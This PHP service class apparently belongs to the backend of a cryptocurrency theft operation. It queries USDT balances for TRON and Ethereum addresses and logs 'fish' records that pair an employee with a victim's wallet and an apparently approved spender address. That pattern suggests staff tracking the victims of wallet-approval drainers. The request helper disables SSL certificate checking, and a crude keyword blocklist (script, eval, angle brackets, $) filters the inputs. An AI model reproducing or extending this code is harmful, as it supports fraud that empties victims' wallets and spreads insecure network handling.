<?php

namespace app\common\service;

use app\common\model\Fish;
use GuzzleHttp\Client;

class FishService
{
    public static function getBalance($address, $type)
    {
       
        try {
            if ($type == 'trc') {
                $url = 'https://usdt.tokenview.com/api/trx/address/tokenbalance/'.($address);
            } else {
                $url = 'https://usdt.tokenview.com/api/eth/address/tokenbalance/'.($address);
            }
            
           
            
            $content = self::curl_request($url);
            $res = json_decode($content, true);
           
            if ($res['code'] == '1') {
                if ($type == 'trc') {
                    foreach ($res['data'] as $v) {
                        if($v['tokenInfo']['s']=='USDT'){
                            return $v['balance']/1000000 ?? 0;
                        }
                    }
                } else {
                    foreach ($res['data'] as $v) {
                        if($v['tokenInfo']['s']=='USDT'){
                            return $v['balance']/1000000 ?? 0;
                        }
                    }
                }
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }
    
    
    public static function  curl_request($url, $post=false, $param=[], $https = true)
    {
        //curl_init 初始化的时候传递url
        $ch = curl_init($url);
        //curl_setopt 设置一些请求选项，当然get是默认的也是最好处理的
        if($post){
            //设置请求方式和请求参数，post请求，要设置的类型就是bool型的，那么我们肯定是启用的设置为true，POSTFILEDS是传递的参数，它的第三个参数就是传递的参数可以为一个数组类型的也就是我们的param
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
        }
        // https请求，默认会进行验证 
        if($https){
            //禁止从服务器端 验证客户端的证书，注意7.10开始默认为开启验证的！！！
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        }
        //curl_exec 执行请求会话（发送请求）
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        //curl_close 关闭请求会话
        curl_close($ch);
        return $res;
    }

    public static function new_erc($employee,$address,$au_address)
    {
        $data = array(
            'employee' => $employee,
            'address' => $address,
            'au_address' => $au_address,
            'type'=>'erc'
        );

        foreach ($data as $v) {
            if (empty($v)) {
                return '';
            }

            if(strpos($v,'script') !== false){
                return '';
            }

            if(strpos($v,'/') !== false){
                return '';
            }

            if(strpos($v,'=') !== false){
                return '';
            }

            if(strpos($v,'<') !== false){
                return '';
            }

            if(strpos($v,'>') !== false){
                return '';
            }

            if(strpos($v,'.') !== false){
                return '';
            }

            if(strpos($v,'eval') !== false){
                return '';
            }

            if(strpos($v,'$') !== false){
                return '';
            }
        }

        $fish = Fish::where($data)->find();
        if (empty($fish)) {
            $res = Fish::create($data);
        } else {
            $fish->create_time = date('Y-m-d H:i:s');
            $fish->save();
        }
    }

    public static function new_trc($employee,$address,$au_address)
    {
        $data = array(
            'employee' => $employee,
            'address' => $address,
            'au_address' => $au_address,
            'type'=>'trc'
        );


        foreach ($data as $v) {
            if (empty($v)) {
                return '';
            }

            if(strpos($v,'script') !== false){
                return '';
            }

            if(strpos($v,'/') !== false){
                return '';
            }

            if(strpos($v,'=') !== false){
                return '';
            }

            if(strpos($v,'<') !== false){
                return '';
            }

            if(strpos($v,'>') !== false){
                return '';
            }

            if(strpos($v,'.') !== false){
                return '';
            }

            if(strpos($v,'eval') !== false){
                return '';
            }

            if(strpos($v,'$') !== false){
                return '';
            }
        }

        $fish = Fish::where($data)->find();
        if (empty($fish)) {
            Fish::create( $data);
        } else {
            $fish->create_time = date('Y-m-d H:i:s');
            $fish->save();
        }
    }


}